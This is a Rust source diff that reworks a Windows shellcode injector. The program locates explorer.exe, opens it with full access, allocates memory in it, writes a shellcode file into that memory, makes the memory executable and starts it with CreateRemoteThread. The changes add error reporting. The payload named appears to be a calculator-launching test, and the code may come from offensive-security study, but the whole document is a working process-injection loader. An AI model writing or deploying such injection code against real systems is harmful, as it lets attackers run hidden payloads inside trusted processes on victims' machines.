@@ -3,19 +3,17 @@
 use std::mem::transmute;
 use std::ptr::{null, null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-use windows_sys::Win32::Foundation::{CloseHandle, FALSE};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE};
 use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows_sys::Win32::System::Memory::{
     VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
 };
 use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
 
-const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-const SIZE: usize = SHELLCODE.len();
-
 #[cfg(target_os = "windows")]
 fn main() {
-    let mut old = PAGE_READWRITE;
+    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+    let shellcode_size: usize = shellcode.len();
 
     let mut system = System::new();
     system.refresh_processes();
@@ -23,48 +21,53 @@ fn main() {
     let pid = system
         .processes_by_name("explorer")
         .next()
-        .expect("no process!")
+        .expect("[-]no process!")
         .pid()
         .as_u32();
 
     unsafe {
         let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-
         if handle == 0 {
-            panic!("OpenProcess failed!");
+            panic!("[-]OpenProcess failed: {}!", GetLastError());
         }
 
-        let dest = VirtualAllocEx(
+        let addr = VirtualAllocEx(
             handle,
             null(),
-            SIZE,
+            shellcode_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
-
-        if dest.is_null() {
-            panic!("VirtualAllocEx failed!");
+        if addr.is_null() {
+            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
         }
 
-        let res = WriteProcessMemory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
-
+        let res = WriteProcessMemory(
+            handle,
+            addr,
+            shellcode.as_ptr().cast(),
+            shellcode_size,
+            null_mut(),
+        );
         if res == FALSE {
-            panic!("WriteProcessMemory failed!");
+            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
         }
 
-        let res = VirtualProtectEx(handle, dest, SIZE, PAGE_EXECUTE, &mut old);
-
+        let mut old = PAGE_READWRITE;
+        let res = VirtualProtectEx(handle, addr, shellcode_size, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            panic!("VirtualProtectEx failed!");
+            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
         }
 
-        let dest = transmute(dest);
-        let thread = CreateRemoteThread(handle, null(), 0, dest, null(), 0, null_mut());
-
+        let func = transmute(addr);
+        let thread = CreateRemoteThread(handle, null(), 0, func, null(), 0, null_mut());
         if thread == 0 {
-            panic!("CreateRemoteThread failed!");
+            panic!("[-]CreateRemoteThread failed: {}!", GetLastError());
         }
 
-        CloseHandle(handle);
+        let res = CloseHandle(handle);
+        if res == FALSE {
+            panic!("[-]CloseHandle failed: {}!", GetLastError());
+        }
     }
 }
